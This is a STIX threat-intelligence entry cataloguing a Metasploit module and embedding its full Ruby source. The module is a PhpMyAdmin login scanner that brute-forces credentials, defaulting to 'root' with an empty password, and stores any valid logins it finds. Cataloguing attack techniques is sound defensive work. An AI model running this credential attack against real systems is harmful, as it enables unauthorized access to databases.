{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b49778d-f29f-4e80-b826-33a2286a2b31",
    "created": "2024-08-14T16:30:38.876945Z",
    "modified": "2024-08-14T16:30:38.87695Z",
    "name": "PhpMyAdmin Login Scanner",
    "description": " This module will attempt to authenticate to PhpMyAdmin. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/phpmyadmin_login.rb",
            "external_id": "phpmyadmin_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/phpmyadmin'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => 'PhpMyAdmin Login Scanner',\n      'Description' => %q{\n        This module will attempt to authenticate to PhpMyAdmin.\n      },\n      'Author'      => [ 'Shelby Pace' ],\n      'License'     => MSF_LICENSE,\n      'DefaultOptions' =>\n        {\n          'RPORT'      => 80,\n          'USERNAME'   => 'root'\n        }\n    ))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The username to PhpMyAdmin', 'root']),\n        OptString.new('PASSWORD', [false, 'The password to PhpMyAdmin', '']),\n        OptString.new('TARGETURI', [true, 'The path to PhpMyAdmin', '/index.php'])\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def scanner(ip)\n    @scanner ||= lambda {\n      cred_collection = build_credential_collection(\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD']\n      )\n\n      return Metasploit::Framework::LoginScanner::PhpMyAdmin.new(\n        configure_http_login_scanner(\n          host: ip,\n          port: datastore['RPORT'],\n          cred_details:       cred_collection,\n          stop_on_success:    datastore['STOP_ON_SUCCESS'],\n          bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],\n          uri: normalize_uri(datastore['TARGETURI']),\n          connection_timeout: 5\n        ))\n      }.call\n  end\n\n  def report_bad_cred(ip, rport, result)\n    invalidate_login(\n      address: ip,\n      port: rport,\n      protocol: 'tcp',\n      public: result.credential.public,\n      private: result.credential.private,\n      realm_key: result.credential.realm_key,\n      realm_value: result.credential.realm,\n      status: result.status,\n      proof: result.proof\n    )\n  end\n\n  def run_host(ip)\n    phpmyadmin_res = scanner(ip).check_setup\n    unless phpmyadmin_res\n      print_brute(:level => :error, :ip => ip, :msg => \"PhpMyAdmin is not available\")\n      return\n    end\n\n    print_status(\"PhpMyAdmin Version: #{phpmyadmin_res}\")\n\n    scanner(ip).scan! do |result|\n        case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute(:level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\")\n          store_valid_credential(\n            user: result.credential.public,\n            private: result.credential.private,\n            private_type: :password,\n            proof: result.proof,\n            service_data: {\n              address: ip,\n              port: rport,\n              service_name: 'http',\n              protocol: 'tcp',\n              workspace_id: myworkspace_id\n            }\n          )\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)\n          report_bad_cred(ip, rport, result)\n        when Metasploit::Model::Login::Status::INCORRECT\n          vprint_brute(:level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\")\n          report_bad_cred(ip, rport, result)\n        end\n    end\n  end\nend\n"
}